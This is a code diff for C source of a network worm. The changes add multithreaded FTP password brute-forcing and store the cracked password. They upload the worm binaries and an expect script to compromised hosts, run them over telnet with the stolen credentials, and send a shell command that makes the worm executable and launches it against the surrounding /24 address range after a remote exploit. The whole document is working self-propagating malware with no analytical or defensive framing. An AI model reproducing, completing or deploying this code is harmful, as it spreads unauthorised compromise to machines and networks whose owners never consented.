@@ -19,6 +19,7 @@ struct bruteforce_arguments {
 
 static pthread_t threads[MAX_THREADS];
 static pthread_mutex_t bruteforce_lock;
+static char ftp_password[MAX_PASSWORD_LENGTH];
 static int ftp_fd = 0;
 static int stop_bruteforce = 0;
 
@@ -41,6 +42,7 @@ void *try_bruteforce(void *arguments) {
 
     if(stop_bruteforce == 0 && (fd = ftp_try_login(arg->target->address, arg->target->port, FTP_USER, guess, arg->thread_id)) > 0) {
       ftp_fd = fd;
+      strncpy(ftp_password, guess, sizeof ftp_password);
       stop_bruteforce = 1;
       fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
     }
@@ -55,9 +57,10 @@ int main(int argc, char *const *argv) {
   struct ifaddrs *addresses, *ifa;
   struct sockaddr_in *addr;
   char cmd_buffer[256];
+  char telnet_buffer[256];
   char range[32];
   char *interface = NULL;
-  int shell_fd, method, opt, err;
+  int shell_fd, telnet_fd, method, opt, err;
   int use_raw_socket = 0, verbose = 0;
   unsigned int i, length;
 
@@ -133,10 +136,19 @@ int main(int argc, char *const *argv) {
     for(target = target_table; target != NULL; target = target->next) {
       if(strstr(target->banner, "FTP") != NULL) {
         fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
-        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
+
+        snprintf(range, sizeof range, "%s", target->address);
+        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
+          range[i] = '\0';
+        }
+
+        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
+        length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
+        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
 
         if((method = rand() % 1) == 0) {
           fprintf(stdout, "Performing brute-force attack...\n");
+
           for(i = 0; i < MAX_THREADS; ++i) {
             args[i].target = target;
             args[i].thread_id = i;
@@ -149,27 +161,22 @@ int main(int argc, char *const *argv) {
           for(i = 0; i < MAX_THREADS; ++i) {
             pthread_join(threads[i], NULL);
           }
+
+          if(ftp_fd != 0) {
+            spread(ftp_fd, "worm", "worm");
+            spread(ftp_fd, "worm.i686", "worm.i686");
+            spread(ftp_fd, "worm.expect", "worm.expect");
+            close(ftp_fd);
+          }
+
+          length = snprintf(telnet_buffer, sizeof telnet_buffer, "./worm.expect %s 23 %s %s %s 1-1024\n", target->address, FTP_USER, ftp_password, range);
+          system(telnet_buffer);
         } else {
-
+          shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
+          write(shell_fd, cmd_buffer, length);
+          close(shell_fd);
         }
 
-        if(ftp_fd != 0) {
-          spread(ftp_fd, "worm", "worm");
-          spread(ftp_fd, "worm.i686", "worm.i686");
-          close(ftp_fd);
-        }
-
-        snprintf(range, sizeof range, "%s", target->address);
-        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
-          range[i] = '\0';
-        }
-
-        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
-        length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
-        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
-
-        write(shell_fd, cmd_buffer, length);
-        close(shell_fd);
         fprintf(stdout, "Attack completed!\n");
       }
     }
